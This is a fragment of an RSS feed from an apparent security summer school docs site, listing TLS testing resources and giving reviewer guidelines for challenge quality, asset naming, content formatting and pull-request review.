&lt;li>&lt;a href="https://jamielinux.com/docs/openssl-certificate-authority/index.html">OpenSSL Certificate Authority&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://testssl.sh/">testssl.sh&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.ssllabs.com/ssltest/">SSL Server Test from SSL Labs&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://geekflare.com/ssl-test-certificate/">https://geekflare.com/ssl-test-certificate/&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.feistyduck.com/library/openssl-cookbook/">https://www.feistyduck.com/library/openssl-cookbook/&lt;/a>&lt;/li>
&lt;/ul></description></item><item><title>Docs: Reviewer guidelines</title><link>/docs/contribution-guidelines/reviewer-guideline/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/contribution-guidelines/reviewer-guideline/</guid><description>
&lt;h2 id="activities--challenges">Activities / Challenges&lt;/h2>
&lt;p>Make sure that activities / challenges are of good quality:&lt;/p>
&lt;ul>
&lt;li>Difficulty is properly set.&lt;/li>
&lt;li>The topic of the activity / challenge is appropriate.&lt;/li>
&lt;li>The provided solution is working.&lt;/li>
&lt;li>Vulnerability and explanations are easy to understand.&lt;/li>
&lt;/ul>
&lt;h2 id="assets">Assets&lt;/h2>
&lt;p>Check if all of them are used and mentioned in the content.
If the assets are not original, make sure their license is compatible to &lt;a href="https://github.com/security-summer-school/template-public/blob/master/COPYING.md">ours&lt;/a> and that their source is properly cited.
Verify that their names are appropriate and respect the following rules:&lt;/p>
&lt;ul>
&lt;li>Use dash between words (e.g. &lt;code>image-name.png&lt;/code>).&lt;/li>
&lt;li>Use only lowercase ASCII characters.&lt;/li>
&lt;/ul>
&lt;h2 id="content">Content&lt;/h2>
&lt;p>Make sure that the content is of good quality:&lt;/p>
&lt;ul>
&lt;li>It follows the general structure of a &lt;a href="https://github.com/security-summer-school/template-public/blob/master/session-name-1/README.md">session&lt;/a>.&lt;/li>
&lt;li>Assets are displayed well.&lt;/li>
&lt;li>The content has at most one sentence per line.&lt;/li>
&lt;li>The content is easy to understand.&lt;/li>
&lt;li>Wording and general spelling are correct.&lt;/li>
&lt;li>Proper formatting is used (such as bold, italic, typewriter formats).&lt;/li>
&lt;/ul>
&lt;h2 id="working-on-pull-requests">Working on Pull Requests&lt;/h2>
&lt;p>You will review contributions as pull requests, following the &lt;a href="https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/reviewing-changes-in-pull-requests/about-pull-request-reviews">PR review guidelines from GitHub&lt;/a>.&lt;/p>
&lt;ul>
&lt;li>Add your review as comments and request for changes to the PR until everything is ready to be approved.&lt;/li>
&lt;li>Add any comments regarding one or more explicit lines as review comments and only publish them together when submitting your review.&lt;/li>
&lt;li>Do not add each individual suggestion or comment as standalone.&lt;/li>
&lt;li>Before approving the PR, make sure that all Github Actions tests ended successfully.&lt;/li>
&lt;li>Once approved, either you or someone with proper access rights can use &lt;code>Rebase and merge&lt;/code> to merge the PR commits and integrate the contribution.&lt;/li>
&lt;/ul></description></item></channel></rss>